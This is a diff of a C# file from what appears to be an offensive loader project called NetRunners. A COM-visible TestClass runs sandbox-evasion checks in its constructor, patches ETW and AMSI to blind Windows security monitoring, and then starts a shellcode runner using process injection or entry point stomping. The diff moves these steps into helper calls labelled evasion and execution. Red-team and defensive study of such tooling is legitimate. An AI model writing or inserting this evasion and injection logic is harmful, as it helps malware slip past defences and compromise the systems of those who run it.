@@ -1,10 +1,5 @@
-﻿using System;
-using System.Diagnostics;
+﻿using System.Diagnostics;
 using System.Runtime.InteropServices;
-using NetRunners.Heuristics;
-using NetRunners.Interfaces;
-using NetRunners.Patchers;
-using NetRunners.Runners;
 
 [ComVisible(true)]
 public class TestClass
@@ -20,16 +15,10 @@ public class TestClass
 
     public TestClass()
     {
-        if (!SleepHeuristic.Check() || !NonEmulatedApiHeuristic.Check() || !EtwPatcher.Patch() || !AmsiPatcher.Patch())
-        {
-            return; // Exit if any checks fail or patching fails
-        }
-
-        // uncomment your choice
-        //IRunner runner = new ProcessInjectionRunner();
-        //IRunner runner = new DefaultRunner();
-        IRunner runner = new EntryPointStompingRunner();
-        runner.Run();
+        // evasion
+        NetRunners.Helpers.Helper.PerformChecks();
+        // execution
+        NetRunners.Helpers.Helper.SelectRunner();
     }
     public void RunProcess(string path)
     {
